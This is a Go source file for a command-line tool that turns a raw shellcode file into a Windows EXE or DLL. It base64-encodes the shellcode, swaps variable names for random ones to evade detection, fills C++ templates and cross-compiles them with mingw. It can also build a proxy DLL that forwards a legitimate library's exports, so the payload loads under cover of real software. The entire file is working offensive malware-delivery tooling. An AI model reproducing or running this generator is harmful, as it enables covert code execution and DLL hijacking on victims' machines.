package main

import (
	"bytes"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"github.com/fcharlie/buna/debug/pe"
)

var (
	shellFile    string
	inputDLL     string
	outputFormat string
	outFile      string
	arch         int
	buildOption  bool

	seededRand *rand.Rand
	err        error
)

const (
	SrcDir      = "src"
	BuildDir    = "build"
	TemplateDir = "templates"
	GppFlags    = "-O3"
)

type TemplateVars struct {
	Shellcode    string
	ShellcodeLen int
	Format       string
	Architecture string
	V            map[string]string
}

func init() {
	// Flags
	flag.StringVar(&shellFile, "i", "", "Shellcode file")
	flag.StringVar(&outputFormat, "f", "exe", "Executable format: dll, exe")
	flag.StringVar(&outFile, "o", "", "Output file")
	flag.StringVar(&inputDLL, "proxy-dll", "", "DLL to proxy functions to")
	flag.IntVar(&arch, "a", 64, "Architecture: 32, 64")
	flag.BoolVar(&buildOption, "build", false, "Build generated code?")

	flag.Parse()

	// Check flags
	if shellFile == "" {
		fmt.Println("Input file required")
		os.Exit(0)
	}
	if outputFormat != "exe" && outputFormat != "dll" {
		fmt.Println("Format must be exe or dll")
		os.Exit(0)
	}

	outputFormat = strings.ToLower(outputFormat)

	seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
}

func main() {
	// Encode shellcode
	fmt.Println("Encoding shellcode...")
	encodedFile, err := encodeFileB64(shellFile)
	if err != nil {
		panic(err)
	}
	fmt.Println("Shellcode encoded!")

	// Generate random variable names
	vNameMin := 3
	vNameMax := 7
	vNames := map[string]string{
		"main":           genVarName(vNameMin, vNameMax),
		"base64_decode":  genVarName(vNameMin, vNameMax),
		"shellcode":      genVarName(vNameMin, vNameMax),
		"shellcodeLen":   genVarName(vNameMin, vNameMax),
		"hInst":          genVarName(vNameMin, vNameMax),
		"fdwReason":      genVarName(vNameMin, vNameMax),
		"lpvReserved":    genVarName(vNameMin, vNameMax),
		"argc":           genVarName(vNameMin, vNameMax),
		"argv":           genVarName(vNameMin, vNameMax),
		"buffer":         genVarName(vNameMin, vNameMax),
		"bufferSize":     genVarName(vNameMin, vNameMax),
		"addressPointer": genVarName(vNameMin, vNameMax),
		"dummy":          genVarName(vNameMin, vNameMax),
		"hThread":        genVarName(vNameMin, vNameMax),
		"input":          genVarName(vNameMin, vNameMax),
		"in_len":         genVarName(vNameMin, vNameMax),
		"kDecodingTable": genVarName(vNameMin, vNameMax),
		"out":            genVarName(vNameMin, vNameMax),
		"inputSize":      genVarName(vNameMin, vNameMax),
		"out_len":        genVarName(vNameMin, vNameMax),
		"outVector":      genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
	}
	// Fill template variables
	sc := TemplateVars{
		Format: outputFormat,
		V:      vNames,
	}

	// Convert file into char array
	cShellcode := ""
	for i, b := range encodedFile {
		cShellcode += fmt.Sprintf("0x%x, ", b)
		if (i+1)%12 == 0 {
			cShellcode += "\n  "
		}
	}
	sc.Shellcode = cShellcode
	sc.ShellcodeLen = len(encodedFile)

	// Define active templates
	templateFiles := []string{
		"shellcode.h.tml",
		"main.cpp.tml",
		"util.cpp.tml",
		"util.h.tml",
	}

	// Generate all required templates
	fmt.Println("Generating source files...")
	mkDir("./src")
	for _, t := range templateFiles {
		err = generateTemplate(fmt.Sprintf("%s/%s", TemplateDir, t), sc)
		if err != nil {
			panic(err)
		}
		fmt.Printf("\tGenerated %s\n", t)
	}

	// Parse target DLL for DLL proxy
	if inputDLL != "" {
		baseFileName := filepath.Base(inputDLL)
		baseFileName = strings.Split(baseFileName, ".")[0]

		targetDLL := fmt.Sprintf("%s/%s_%s.dll", BuildDir, baseFileName, genVarName(3, 5))
		copyFile(inputDLL, targetDLL)

		exportDefinitions, err := generateDLLDef(targetDLL)
		if err != nil {
			panic(err)
		}

		saveFile(fmt.Sprintf("%s/%s.def", SrcDir, baseFileName), []byte(exportDefinitions))

		outFile = baseFileName + ".dll"
	}

	fmt.Println("Generated source!")

	// Generate compilation command
	compileCmd := ""
	if arch == 32 {
		compileCmd += "i686-w64-mingw32-g++ "
	} else {
		compileCmd += "x86_64-w64-mingw32-g++ "
	}

	if outputFormat == "dll" {
		compileCmd += "-shared "
	}

	if outFile == "" {
		outFile = fmt.Sprintf("%s.%s", filepath.Base(shellFile), outputFormat)
	}

	compileCmd += fmt.Sprintf("-o %s/%s ", BuildDir, outFile)
	compileCmd += fmt.Sprintf("%s/*", SrcDir)

	// Build
	if buildOption {
		mkDir("./build")

		fmt.Printf("Compiling: %s\n", compileCmd)
		_, err = exec.Command("sh", "-c", compileCmd).Output()
		if err != nil {
			panic(err)
		}
		fmt.Printf("Compiled at %s\n", outFile)
	} else {
		fmt.Printf("Compile with: %s\n", compileCmd)
	}
}

// Encode file into base64
func encodeFileB64(fileName string) (string, error) {
	fBytes, err := ioutil.ReadFile(fileName)
	if err != nil {
		return "", err
	}

	encodedFile := b64.StdEncoding.EncodeToString(fBytes)
	if err != nil {
		return "", err
	}

	return encodedFile, nil
}

// Fill template and save file
func generateTemplate(templatePath string, tVars TemplateVars) error {
	tBytes, err := fillTemplate(templatePath, tVars)
	if err != nil {
		return err
	}

	outFile := filepath.Base(templatePath)
	outFile = strings.TrimSuffix(outFile, ".tml")

	err = saveFile(fmt.Sprintf("%s/%s", SrcDir, outFile), tBytes.Bytes())
	if err != nil {
		return err
	}

	return nil
}

// Save bytes in file
func saveFile(fileName string, fileBytes []byte) error {
	err := ioutil.WriteFile(fileName, fileBytes, 0644)
	if err != nil {
		return err
	}

	return nil
}

// Convert template to code
func fillTemplate(templatePath string, tVars TemplateVars) (bytes.Buffer, error) {
	tmpl, err := template.ParseFiles(templatePath)
	if err != nil {
		return bytes.Buffer{}, err
	}

	fileBytes := new(bytes.Buffer)
	err = tmpl.Execute(fileBytes, tVars)
	if err != nil {
		return bytes.Buffer{}, err
	}

	return *fileBytes, nil
}

// Generate random variable name
func genVarName(min, max int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	l := seededRand.Intn(max-min) + min
	b := make([]byte, l)

	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}

	return string(b)
}

// Generate DLL proxy definitions
func generateDLLDef(filePath string) (string, error) {
	baseName := filepath.Base(filePath)
	baseName = strings.Split(baseName, ".")[0]

	// Open DLL file
	fd, err := pe.Open(filePath)
	if err != nil {
		return "", err
	}
	defer fd.Close()

	// Parse DLL
	ft, err := fd.LookupFunctionTable()
	if err != nil {
		return "", err
	}

	// Generate exports table
	exports := "EXPORTS\n"
	for _, d := range ft.Exports {
		exports += fmt.Sprintf("%s=%s.%s @%d\n", d.Name, baseName, d.Name, d.Ordinal)
	}

	return exports, nil
}

// Copy file source to dest
func copyFile(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}

// Create directory if it doesn't exist
func mkDir(path string) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return os.Mkdir(path, os.ModeDir|0755)
	}
	return nil
}
